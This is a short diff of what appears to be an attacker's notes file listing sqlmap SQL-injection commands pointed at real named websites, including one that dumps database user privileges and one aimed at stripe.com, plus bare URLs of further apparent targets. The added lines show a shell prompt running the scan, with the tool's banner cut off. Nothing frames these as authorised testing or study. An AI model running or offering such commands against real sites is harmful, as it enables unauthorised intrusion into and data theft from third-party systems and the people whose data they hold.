@@ -1,4 +1,6 @@
 python3 sqlmap.py -u "http://www.pha.org.pk/sro_list.php?catid=1"   --batch   --count -D information_schema  -T USER_PRIVILEGES
 https://www.waikato.ac.nz/ 
 https://www.autarcon.com/index.php?id=178
+└─# python3 sqlmap.py -u "https://stripe.com/docs/api?lang=php" --dbms="MySQL"  --batch --dbs                                                                     127 ⨯
+        _
 
